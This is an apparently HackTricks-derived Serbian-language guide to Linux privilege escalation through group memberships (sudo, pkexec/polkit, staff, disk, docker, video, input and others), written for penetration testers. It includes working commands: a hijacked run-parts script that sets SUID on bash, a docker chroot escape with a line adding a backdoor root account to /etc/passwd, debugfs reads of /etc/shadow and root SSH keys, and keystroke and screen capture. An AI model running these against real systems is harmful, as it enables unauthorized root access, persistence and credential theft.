# Zanimljive grupe - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin grupe

### **PE - Method 1**

**Ponekad**, politika **/etc/sudoers** sistema (ili datoteka koja je u nju uključena) sadrži unose kao što su:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

To znači da svaki korisnik koji odgovara bilo kom od unosa može da pokrene bilo koju komandu kao bilo koji ciljni korisnik putem `sudo` (u skladu sa ostatkom politike).<sup>[[3]](#references)</sup>

Ako je to slučaj, **da biste postali root, možete jednostavno da izvršite**:

```
sudo su
```

Ako `sudo -l` dozvoljava ograničeno pokretanje komande `adduser` samo sa korisničkim imenom, proverite da li se pritom kreira primarna grupa istog imena koja još ne postoji. Novi nalog u toj grupi može dobiti privilegije ako važeća sudoers politika već dodeljuje privilegije grupi `%group`; proverite i ponašanje pri kreiranju grupe i pravilo za grupu pre nego što ovo smatrate putem za eskalaciju privilegija. Kreiranje naloga menja sistem, zato prvo pregledajte politiku.

### PE - Metod 2

Pronađite sve SUID binarne datoteke i proverite da li postoji binarna datoteka **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Ako je **pkexec SUID binarna datoteka**, može da izvrši program kao drugi korisnik samo kada polkit odobri traženu radnju; sam SUID bit ne garantuje root pristup. Proverite instaliranu polisu i ovlašćenja sesije ciljnog korisnika umesto da pretpostavite da je članstvo u grupi **sudo** ili **admin** dovoljno.<sup>[[4]](#references)[[5]](#references)</sup>

Za zaseban put [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), prvo proverite da li je `pkexec` izvršna datoteka u vlasništvu korisnika **root** sa postavljenim SUID bitom. Instalirana binarna datoteka bez tog bita ne predstavlja lokalnu SUID eskalaciju opisanu u bezbednosnom upozorenju. Niz verzije iz upstream-a samo je naznaka: distribucije mogu [backport-ovati ispravku u starije verzije paketa](https://ubuntu.com/security/CVE-2021-4034), zato pre nego što je proglasite ranjivom, proverite instalirani paket dobavljača i mere ublažavanja.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) predstavlja drugačiji polkit put: trku pri autorizaciji preko D-Bus-a, a ne SUID propust u `pkexec`. Proverite instalirani polkit paket dobavljača i da li dostupna privilegovana D-Bus radnja može da izvrši korisnu izmenu; put za kreiranje naloga zahteva i odgovarajuću uslugu, kao što je AccountsService, a sudo pristup svake nove grupe zavisi od efektivne sudo polise. Prijavljena verzija polkit-a ili sama instalirana usluga samo su kandidati, naročito tamo gde dobavljači [backport-uju ispravke](https://access.redhat.com/security/cve/cve-2021-3560). Pasivno prikupljanje informacija ne bi smelo da pokrene trku.

Na distribucijama koje još koriste stariji backend Local Authority, pregledajte njegova pravila za grupe pomoću:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Relevantni nazivi grupa i podrazumevane vrednosti razlikuju se u zavisnosti od distribucije; grupa je ovde korisna samo ako je navedena u lokalnoj politici.<sup>[[5]](#references)</sup>

Da biste **postali root, možete izvršiti**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Ako pokušate da pokrenete **pkexec** i dobijete ovu **grešku**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

U SSH sesiji bez registrovanog authentication agenta, `pkexec` može da prikaže ovu grešku čak i kada bi pravila inače dozvoljavala tu radnju; polkit dokumentuje `pkttyagent` kao tekstualni authentication agent za sesije koje nisu desktop sesije. Tačno ponašanje zavisi od verzije i distribucije, zato proverite lokalna pravila i podešavanje agenta. Jedno zaobilazno rešenje prijavljeno za pogođene verzije NixOS-a koristi **2 različite SSH sesije**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

ACL koji jednom nalogu uskraćuje pristup komandi `su` odnosi se na tu izvršnu datoteku, a ne na svaki način pokretanja radnje za koju je administrator ovlašćen. Ako su administratorski podaci za prijavu nezavisno izloženi, proverite da li efektivna polkit pravila dozvoljavaju zasebnu radnju, kao što je pokretanje privremene sistemske usluge pomoću `systemd-run`, koji identitet prihvata authentication agent i koji bi identitet koristila pokrenuta usluga. [Polkit razlikuje autentifikaciju kao vlasnik sesije od autentifikacije kao administrator](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), dok [systemd-run može da zatraži privremenu uslugu od sistemskog menadžera](https://systemd.io/CONTROL_GROUP_INTERFACE/). Unos u istoriji, instalirana komanda ili čitljiva datoteka sa pravilima sami po sebi ne potvrđuju ovlašćenje niti ispravnost podataka za prijavu; pasivni pregled ne bi trebalo da šalje podatke za prijavu niti da pokreće jedinicu.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel grupa

Ponekad sudoers politika može da sadrži i ovaj unos:

```
%wheel	ALL=(ALL:ALL) ALL
```

To znači da svaki korisnik koji odgovara ovom unosu može da pokrene bilo koju komandu kao bilo koji ciljni korisnik pomoću `sudo` (u skladu sa ostatkom pravila).<sup>[[3]](#references)</sup>

Ako je to slučaj, da biste **postali root, samo pokrenite**:

```
sudo su
```

## Shadow Group

Na sistemima čije dozvole to omogućavaju, korisnici u grupi **shadow** mogu **čitati** **/etc/shadow**; proverite stvarni režim i ACL-ove na ciljnom sistemu:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Dakle, pročitajte datoteku i pokušajte da **crackujete neke hash vrednosti**.

Važna nijansa u vezi sa stanjem zaključavanja pri trijaži hash vrednosti:
- Unosi sa `!` ili `*` uglavnom ne omogućavaju interaktivnu prijavu lozinkom.
- `!hash` znači da je lozinka zaključana; preostali znakovi predstavljaju polje lozinke pre zaključavanja.
- Polje koje sadrži `*` nije važeći `crypt(3)` hash i sprečava prijavu UNIX lozinkom; na osnovu toga nemojte zaključivati da li je lozinka ranije bila postavljena.
Ovo je korisno za klasifikaciju naloga čak i kada je direktna prijava blokirana.<sup>[[6]](#references)</sup>

## Staff Group

**staff**: Omogućava korisnicima da dodaju lokalne izmene u sistem (`/usr/local`) bez potrebe za root privilegijama (imajte na umu da se izvršne datoteke u `/usr/local/bin` nalaze u promenljivoj PATH svakog korisnika i mogu da „nadjačaju“ izvršne datoteke istog imena u `/bin` i `/usr/bin`). Uporedite sa grupom „adm“, koja je više povezana sa nadgledanjem/bezbednošću.<sup>[[2]](#references)[[7]](#references)</sup>

U Debian konfiguracijama u kojima se `/usr/local/bin` nalazi ispred `/usr/bin` u `PATH` (kao u primerima ispod), neizričito navedena komanda prvo se razrešava na kopiju iz `/usr/local/bin`; proverite efektivnu vrednost `PATH` na ciljnom sistemu.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ako privilegovani proces razrešava nekvalifikovanu komandu preko direktorijuma `/usr/local/bin` koji je moguće menjati, zamena te komande može da se izvrši sa privilegijama tog procesa; pre testiranja proverite stvarnu putanju i način pokretanja.

Na Ubuntu sistemima, `pam_motd` prilikom prijave kao root pokreće izvršne skripte putem `run-parts --lsbsysinit`; cron poslovi takođe mogu da koriste `run-parts`, ali to zavisi od distribucije i konfiguracije.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Pri novoj SSH prijavi, `pspy` može pomoći da se potvrdi da li se ova putanja zaista poziva na ciljnom sistemu; može da nadgleda komandne linije procesa bez root privilegija.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk grupa

Članstvo u grupi **disk** može omogućiti direktan pristup blok uređajima i često je **blizu root pristupa**; Debian navodi da je uglavnom ekvivalentno root-u, ali proverite stvarne dozvole uređaja i raspored skladišta na ciljnom sistemu.<sup>[[7]](#references)</sup>

Uobičajene putanje uređaja uključuju `/dev/sd*`, ali NVMe i drugi rasporedi skladišta koriste drugačije nazive.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` radi na ext2/ext3/ext4 fajl sistemima; putanje kao što su `/root` i `/etc/shadow` iznad označavaju fajlove unutar otvorenog fajl sistema, dok je drugi argument komande `dump` izlazna putanja na matičnom fajl sistemu.<sup>[[8]](#references)</sup> Na primer, ovo izdvaja `/tmp/asd1.txt` iz otvorenog fajl sistema u `/tmp/asd2.txt` na matičnom fajl sistemu:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Opcija `-w` otvara datotečni sistem za čitanje i pisanje, a komanda `write` kopira lokalnu datoteku u otvoreni datotečni sistem. Izbegavajte da je koristite na montiranom aktivnom datotečnom sistemu jer direktne izmene mogu oštetiti datotečni sistem; kad god je moguće, radite sa slikom van mreže.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video Group

Pomoću komande `w` možete da saznate **ko je prijavljen na sistem**, a prikazaće izlaz poput sledećeg.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Unos **tty1** označava prvu Linux virtuelnu konzolu; sam po sebi ne dokazuje da je korisnik fizički prisutan za mašinom, naročito u kontejnerima ili drugim okruženjima.<sup>[[21]](#references)</sup>

Na sistemima koji izlažu čitljiv framebuffer uređaj, članstvo u grupi **video** može da omogući pristup tom uređaju. Linux framebuffer interfejs dokumentuje `/dev/fb0` kao čitljiv memorijski uređaj koji se može kopirati radi snimka ekrana; putanja `/sys/class/graphics/fb0/virtual_size` dostupna je samo tamo gde postoji taj fbdev sysfs atribut, zato prvo proverite cilj.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Ako instalirana verzija **GIMP**-a ima uvoznik sirovih podataka, otvorite **`screen.raw`** pomoću tog uvoznika; podrška i kontrole se razlikuju u zavisnosti od verzije i dodatka.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Da biste otvorili sirovu sliku, možete koristiti GIMP; izaberite datoteku screen.raw i kao tip datoteke izaberite Raw image data](<../../../images/image (463).png>)

Podesite širinu i visinu slike tako da odgovaraju geometriji framebuffer-a; isprobajte dostupne formate piksela/vrste slike dok izlaz ne postane čitljiv.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Zatim izmenite širinu i visinu tako da odgovaraju vrednostima koje se koriste na ekranu i isprobajte različite vrste slike (izaberite onu koja najbolje prikazuje ekran)](<../../../images/image (317).png>)

## Ulazna grupa

Na sistemima na kojima grupa `input` ima dozvolu za čitanje uređaja za tastaturu, član grupe može da posmatra sirove pritiske tastera sa tog uređaja. Najpre proverite stvarni režim pristupa i ACL: aktivno lokalno sedište može dobiti pristup i putem ACL-a `uaccess`, a samo ime grupe ne garantuje pristup.<sup>[[23]](#references)[[24]](#references)</sup>

Pronađite rukovalac `eventX` za tastaturu, potvrdite da trenutni nalog može da čita njegov čvor, a zatim pomoću `evtest` nadgledajte kratak, odobren test. **Nemojte** koristiti `--grab`: on preuzima ekskluzivan pristup i može sprečiti druge aplikacije da primaju ulazne podatke.<sup>[[25]](#references)[[26]](#references)</sup>

```bash
id -nG
cat /proc/bus/input/devices            # Match the keyboard name with its eventX handler
ls -l /dev/input/by-id/*event-kbd      # If persistent keyboard links exist
getfacl /dev/input/eventX             # Check effective group/seat ACL access
evtest /dev/input/eventX              # Stop with Ctrl-C after the test
```

`EV_KEY` prijavljuje kodove tastera, a ne gotov tekst: vrednost `1` označava pritisak, `0` otpuštanje, a `2` ponavljanje. To može otkriti tastere pritisnute u drugoj sesiji pomoću te fizičke tastature, uključujući akreditive, ali samo po sebi ne obezbeđuje root pristup. Desktop kompozitor ne ukida pristup sirovom čvoru uređaja.<sup>[[25]](#references)</sup>

Za šire provere identiteta i sesija pogledajte [korisnike i sesije](../user-and-session-triage.md).

## Root grupa

Članstvo u grupi **root** ne daje UID korisnika root, ali datoteke u vlasništvu korisnika `root` u koje grupa može da upisuje i dalje mogu biti zanimljive ako ih koriste privilegovani servisi ili biblioteke. Proverite stvarne dozvole datoteke i način na koji se koristi pre nego što je smatrate putem za eskalaciju privilegija.

**Proverite koje datoteke mogu da menjaju članovi grupe root**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker grupa

Članstvo u grupi `docker` daje pristup Docker daemon-u na nivou root korisnika u standardnim rootful instalacijama. Pošto su bind mount-ovi podrazumevano dostupni za čitanje i pisanje, korisnik koji može da upravlja tim daemon-om može da montira host-ov `/` u kontejner i menja fajlove na host-u; to mu efektivno daje root pristup host-u.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Članstvo u grupi možda nije sinhronizovano između `/etc/group`, `/etc/gshadow` i tokena trenutnog procesa. Ako korisnik nije prikazan u `id -nG`, ali `newgrp docker` uspe, proverite grupu koju prikazuje `id` u novoj ljusci i testirajte da li je Docker socket zaista dostupan za pisanje i da li koristi rootful daemon. Sam naziv grupe ne potvrđuje kontrolu nad host-om. Ograničite trajanje svake automatizovane `newgrp` provere kako upit za lozinku ne bi zaustavio enumeraciju.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Konačno, ako vam se nijedan od prethodnih predloga ne dopada ili iz nekog razloga ne funkcionišu (npr. firewall za Docker API), uvek možete pokušati da **pokrenete privileged container i izvršite escape iz njega**, kao što je objašnjeno ovde:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Ako imate dozvole za pisanje nad Docker socket-om, pročitajte [**ovu objavu o eskalaciji privilegija zloupotrebom Docker socket-a**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd grupa

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm grupa

Obično **članovi** grupe **`adm`** imaju dozvole za **čitanje log** datoteka koje se nalaze u _/var/log/_.\
Zato, ako ste kompromitovali korisnika koji pripada ovoj grupi, obavezno **pregledajte logove**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail grupe

Ove grupe imaju značenja specifična za servise i distribucije. Debian opisuje `backup` kao grupu za delegirano pravljenje i vraćanje rezervnih kopija, `lp` za printer daemon-e, a `mail` za `/var/mail`, pa pre nego što članstvo u njima smatrate putem do privilegija, proverite lokalne dozvole.<sup>[[7]](#references)</sup>

Često su to vektori za **otkrivanje akreditiva**, a ne direktni vektori do root privilegija:
- **backup**: može izložiti arhive sa konfiguracijama, ključevima, DB dump-ovima ili tokenima.
- **operator**: operativni pristup specifičan za platformu koji može da otkrije osetljive podatke tokom rada.
- **lp**: redovi za štampu/spool datoteke mogu sadržati dokumente.
- **mail**: mail spool datoteke mogu izložiti linkove za resetovanje, OTP kodove i interne akreditive.

Članstvo u ovim grupama tretirajte kao nalaz izloženosti podataka visoke vrednosti i nastavite istragu proverom ponovne upotrebe lozinki/tokena.

## Auth grupa

Na OpenBSD-u, kada je S/Key konfigurisan, `/etc/skey` je u vlasništvu `root:auth`, a za pristup njegovim zapisima potrebna je grupa `auth`; YubiKey zapisi se čuvaju u `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Ranjiva konfiguracija OpenBSD 6.6 sa uključenim S/Key ili YubiKey omogućavala je lokalnim korisnicima sa privilegijama `auth` da postanu root; Qualys opisuje preduslove i tok eksploatacije, a povezani PoC ga implementira.<sup>[[18]](#references)[[19]](#references)</sup>



## References

- [1] [pkexec/pkttyagent autentifikacija bez GUI sesije (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian man stranice](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit referentni priručnik](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit referentni priručnik](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux man stranica](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Priručnik za obezbeđivanje Debian-a](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux man stranica](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Uređaj Frame Buffer — dokumentacija Linux kernela](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu man stranice](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian man stranice](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — nadgledanje Linux procesa bez privilegija](https://github.com/DominicBreuker/pspy)
- [13] [Bezbednost Docker Engine-a](https://docs.docker.com/engine/security/)
- [14] [Upravljanje Docker-om kao korisnik koji nije root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Pokretanje container-a — Docker dokumentacija](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD man stranice](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD man stranice](https://man.openbsd.org/login_yubikey.8)
- [18] [Ranjivosti autentifikacije u OpenBSD-u — bezbednosno obaveštenje Qualys-a](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — lokalni exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux man stranica](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Dodeljeni Linux uređaji (verzija 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Uvoz i izvoz slika — GIMP dokumentacija](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
- [23] [Smernice za dozvole beep uređaja — Debian Sources](https://sources.debian.org/src/beep/1.4.9-1/PERMISSIONS.md)
- [24] [sd-login — systemd priručnik](https://freedesktop.org/software/systemd/man/latest/sd-login.html)
- [25] [Kodovi ulaznih događaja — dokumentacija Linux kernela](https://docs.kernel.org/5.18/input/event-codes.html)
- [26] [evtest(1) — Debian man stranice](https://manpages.debian.org/bookworm/evtest/evtest.1.en.html)
{{#include ../../../banners/hacktricks-training.md}}
